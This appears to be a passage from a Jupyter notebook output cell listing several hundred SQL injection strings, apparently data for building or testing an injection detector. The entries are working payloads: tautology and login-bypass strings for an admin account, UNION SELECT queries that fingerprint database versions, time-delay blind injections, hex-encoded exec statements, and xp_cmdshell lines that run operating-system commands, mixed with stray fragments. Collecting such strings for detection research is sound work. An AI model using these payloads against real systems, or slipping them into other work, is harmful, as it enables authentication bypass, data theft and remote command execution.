       " ' select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 <@$_ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@$_ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@<@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 %!<1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1<@<@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@<@ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 %!<@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@&@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@$$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 &@ or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' or ||/1 = 1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<\\\\ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<\\\\ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<$ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1'   or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or $<\\\\ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or $<\\\\. union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or $<\\\\ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<\\\\. or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<\\\\. union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<1 or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<\\\\ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<$ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<$ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or !<@ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'\",\n",
       " ' select * from users where id = 1 or \" (  ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( ,\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( .\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( 1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \" ( ;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( ]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\" (  union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\" (  union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\" (  union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\" (  union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \" ( #\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( [\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( _\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\" (  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\" (  = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \" ( &\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( @\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( {\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" )  ( \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) ,\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) .\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) 1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \" ) ;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) ]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) [\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) $\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) @\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) {\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \", ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \", ) \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \",,\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \",.\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \",;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \",?\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\", union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\", union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\", union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\", union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \",#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\", = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\", = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \",&\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \",{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \". ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \". ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".,\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"..\" = 1 or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \".;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\". union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\". union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\". union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\". union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \".#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"._\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\". = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\". = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \".%\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1 ( \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1 ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1,\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"1;\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"1 union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"1 union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"1 union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"1#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1_\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1&\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' or \"\"<@ union select 1,version (  )  -- 1\\'',\n",
       " '&1c',\n",
       " ' ( s',\n",
       " ' ) s',\n",
       " ',s',\n",
       " '.s',\n",
       " '1s',\n",
       " ';s',\n",
       " '?s',\n",
       " 'UE1',\n",
       " 'UEf',\n",
       " 'UEs',\n",
       " 'UEv',\n",
       " 'c',\n",
       " 'n',\n",
       " 'ns',\n",
       " 'os',\n",
       " 's',\n",
       " 'v',\n",
       " '{s',\n",
       " ' select * from users where id = 1 or 1#\"; or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"; ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"; ) \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";,\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";.\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \";]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \";#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";_\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\"; = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \";&\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' union select \";\"_,version (  )  -- 1\\'',\n",
       " ' select * from users where id = 1 or \";@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"? ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"] ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"?,\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' union select $[\"],@@VERSION -- 1\\'',\n",
       " ' select * from users where id = 1 or \"].\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"]1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"?;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"??\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"?#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"?[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"?_\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"?%\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' union select \"?\"_,version (  )  -- 1\\'',\n",
       " ' select * from users where id = 1 or \"?@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"]{\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' union select ||/1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' union select  ( \\\\ ) ,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select  ( \\\\. ) ,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' union select \\\\,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select \\\\.,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select \\\\.#,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select \\\\.%1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'\",\n",
       " ' select * from users where id = \\'1\\' union select 1\"!\",banner from v$version where rownum = 1 -- 1\\'',\n",
       " \" select * from users where id = '1' union select \\\\#,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select $ .,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select $ _,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select $*$,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select +\\\\,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select +\\\\.,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select !<1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' union select +\\\\#,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select !<@,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' union select @ 1,version (  )  --  1'\",\n",
       " \" select * from users where id = '1'   union select null,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' union select @ @1,version (  )  --  1'\",\n",
       " ' select * from users where id = 1 or \"\\\\#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$ ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"_ ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' union select \"[\"_,version (  )  -- 1\\'',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"_;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$?\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"$ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"$ union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"$ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"$#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$_\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$&\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"$@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"_{\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' * ( \\\\ )  or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' +  ( \\\\ )  union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' +  ( \\\\. )  union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " ' select * from users where id = 1 or \"& ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"& ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"%,\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1'<@.. or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1'<@.. union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' <@.$ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' <@._ union select 1,version (  )  -- 1'\",\n",
       " ' select * from users where id = 1 or \"%.\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' *1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " ' select * from users where id = 1 or \"%1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"%;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"%?\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' *$ . or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' *$ 1 or 1 = 1 -- 1'\",\n",
       " ' select * from users where id = 1 or \"%[\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' <@$_ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' <@$_ union select 1,version (  )  -- 1'\",\n",
       " ' select * from users where id = 1 or \"%_\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' + $+%\\\\ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' <@&1 or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' <@&1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' <@<@ union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + $+%$ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'\",\n",
       " ' select * from users where id = 1 or \"%&\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' <@&@ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1'<@$$ union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + @ ( 1 )  union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + @ 1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + @ 1! union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' + @ @1 union select 1,version (  )  -- 1'\",\n",
       " ' select * from users where id = 1 or \"%{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"@ ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"@ ) \" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"@;\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"@?\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"@ union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"@ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"@#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"@%\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{ ( \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{ ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{,\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{.\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{1\" = 1 or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"{;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{?\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"{ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"{ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"{ union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"{ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"{#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\"{ = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\"{ = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"{%\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"{{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + @`\\\\` union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + @<1# union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + @<@. union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 -@<@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 -@<@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 -@<@ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + @<@# union select null,version (  )  -- 1',\n",
       " \"'-'\",\n",
       " \"' '\",\n",
       " \"'&'\",\n",
       " \"'^'\",\n",
       " \"'*'\",\n",
       " \"' or ''-'\",\n",
       " \"' or '' '\",\n",
       " \"' or ''&'\",\n",
       " \"' or ''^'\",\n",
       " \"' or ''*'\",\n",
       " '\"-\"',\n",
       " '\" \"',\n",
       " '\"&\"',\n",
       " '\"^\"',\n",
       " '\"*\"',\n",
       " '\" or \"\"-\"',\n",
       " '\" or \"\" \"',\n",
       " '\" or \"\"&\"',\n",
       " '\" or \"\"^\"',\n",
       " '\" or \"\"*\"',\n",
       " 'or true--',\n",
       " '\" or true--',\n",
       " \"' or true--\",\n",
       " '\" )  or true--',\n",
       " \"' )  or true--\",\n",
       " \"' or 'x' = 'x\",\n",
       " \"' )  or  ( 'x' )  =  ( 'x\",\n",
       " \"'  )  )   or   (  (  'x'  )  )   =   (  (  'x\",\n",
       " '\" or \"x\" = \"x',\n",
       " '\" )  or  ( \"x\" )  =  ( \"x',\n",
       " '\"  )  )   or   (  (  \"x\"  )  )   =   (  (  \"x',\n",
       " 'or 1 = 1',\n",
       " 'or 1 = 1-- ',\n",
       " 'or 1 = 1#',\n",
       " 'or 1 = 1/*',\n",
       " \"admin' --\",\n",
       " \"admin' #\",\n",
       " \"admin'/*\",\n",
       " \"admin' or '1' = '1\",\n",
       " \"admin' or '1' = '1'--\",\n",
       " \"admin' or '1' = '1'#\",\n",
       " \"admin' or '1' = '1'/*\",\n",
       " \"admin'or 1 = 1 or '' = '\",\n",
       " \"admin' or 1 = 1\",\n",
       " \"admin' or 1 = 1--\",\n",
       " \"admin' or 1 = 1#\",\n",
       " \"admin' or 1 = 1/*\",\n",
       " \"admin' )  or  ( '1' = '1\",\n",
       " \"admin' )  or  ( '1' = '1'--\",\n",
       " \"admin' )  or  ( '1' = '1'#\",\n",
       " \"admin' )  or  ( '1' = '1'/*\",\n",
       " \"admin' )  or '1' = '1\",\n",
       " \"admin' )  or '1' = '1'--\",\n",
       " \"admin' )  or '1' = '1'#\",\n",
       " \"admin' )  or '1' = '1'/*\",\n",
       " \"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\",\n",
       " 'admin\" --',\n",
       " 'admin\" #',\n",
       " 'admin\"/*',\n",
       " 'admin\" or \"1\" = \"1',\n",
       " 'admin\" or \"1\" = \"1\"--',\n",
       " 'admin\" or \"1\" = \"1\"#',\n",
       " 'admin\" or \"1\" = \"1\"/*',\n",
       " 'admin\"or 1 = 1 or \"\" = \"',\n",
       " 'admin\" or 1 = 1',\n",
       " 'admin\" or 1 = 1--',\n",
       " 'admin\" or 1 = 1#',\n",
       " 'admin\" or 1 = 1/*',\n",
       " 'admin\" )  or  ( \"1\" = \"1',\n",
       " 'admin\" )  or  ( \"1\" = \"1\"--',\n",
       " 'admin\" )  or  ( \"1\" = \"1\"#',\n",
       " 'admin\" )  or  ( \"1\" = \"1\"/*',\n",
       " 'admin\" )  or \"1\" = \"1',\n",
       " 'admin\" )  or \"1\" = \"1\"--',\n",
       " 'admin\" )  or \"1\" = \"1\"#',\n",
       " 'admin\" )  or \"1\" = \"1\"/*',\n",
       " '1234 \" AND 1 = 0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055',\n",
       " \"'sqlvuln\",\n",
       " \"'+sqlvuln\",\n",
       " 'sqlvuln;',\n",
       " ' ( sqlvuln ) ',\n",
       " \"a' or 1 = 1--\",\n",
       " '\"a\"\" or 1 = 1--\"',\n",
       " ' or a  =  a',\n",
       " \"a' or 'a'  =  'a\",\n",
       " '1 or 1 = 1',\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " \"1 waitfor delay '0:0:10'--\",\n",
       " 'declare @q nvarchar  ( 4000 )  select @q  = ',\n",
       " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',\n",
       " '0',\n",
       " '031003000270000',\n",
       " 'declare @s varchar ( 22 )  select @s  = ',\n",
       " '0x77616974666F722064656C61792027303A303A31302700 exec ( @s ) ',\n",
       " '0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ) ',\n",
       " 'declare @s varchar  ( 8000 )  select @s  =  0x73656c65637420404076657273696f6e',\n",
       " 'exec ( @s ) ',\n",
       " \"a'\",\n",
       " '?',\n",
       " \"' or 1 = 1\",\n",
       " '‘ or 1 = 1 --',\n",
       " \"x' AND userid IS NULL; --\",\n",
       " \"x' AND email IS NULL; --\",\n",
       " \"anything' OR 'x' = 'x\",\n",
       " \"x' AND 1 =  ( SELECT COUNT ( * )  FROM tabname ) ; --\",\n",
       " \"x' AND members.email IS NULL; --\",\n",
       " \"x' OR full_name LIKE '%Bob%\",\n",
       " '23 OR 1 = 1',\n",
       " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
       " \"'\",\n",
       " \"' or '' = '\",\n",
       " \"' or 'x' = 'x\",\n",
       " ' or x = x',\n",
       " \"' )  or  ( 'x' = 'x\",\n",
       " '0 or 1 = 1',\n",
       " \"' or 0 = 0 --\",\n",
       " '\" or 0 = 0 --',\n",
       " 'or 0 = 0 --',\n",
       " \"' or 0 = 0 #\",\n",
       " ' or 0 = 0 #\"',\n",
       " 'or 0 = 0 #',\n",
       " \"' or 1 = 1--\",\n",
       " '\" or 1 = 1--',\n",
       " \"' or '1' = '1'--\",\n",
       " \"' or 1 --'\",\n",
       " 'or 1 = 1--',\n",
       " 'or 1 = 1',\n",
       " 'or 1 = 1 --',\n",
       " \"' or 1 = 1 or '' = '\",\n",
       " ' or 1 = 1 or \"\" = ',\n",
       " \"' or a = a--\",\n",
       " ' or a = a',\n",
       " \"' )  or  ( 'a' = 'a\",\n",
       " ' )  or  ( a = a',\n",
       " 'hi or a = a',\n",
       " 'hi or 1 = 1 --\"',\n",
       " \"hi' or 1 = 1 --\",\n",
       " \"hi' or 'a' = 'a\",\n",
       " \"hi' )  or  ( 'a' = 'a\",\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " \"'hi' or 'x' = 'x';\",\n",
       " '@variable',\n",
       " ',@variable',\n",
       " 'PRINT',\n",
       " 'PRINT @@variable',\n",
       " 'select',\n",
       " 'insert',\n",
       " 'as',\n",
       " 'or',\n",
       " 'procedure',\n",
       " 'limit',\n",
       " 'order by',\n",
       " 'asc',\n",
       " 'desc',\n",
       " 'delete',\n",
       " 'update',\n",
       " 'distinct',\n",
       " 'having',\n",
       " 'truncate',\n",
       " 'replace',\n",
       " 'like',\n",
       " 'handler',\n",
       " 'bfilename',\n",
       " \"' or username like '%\",\n",
       " \"' or uname like '%\",\n",
       " \"' or userid like '%\",\n",
       " \"' or uid like '%\",\n",
       " \"' or user like '%\",\n",
       " 'exec xp',\n",
       " 'exec sp',\n",
       " \"'; exec master..xp_cmdshell\",\n",
       " \"'; exec xp_regread\",\n",
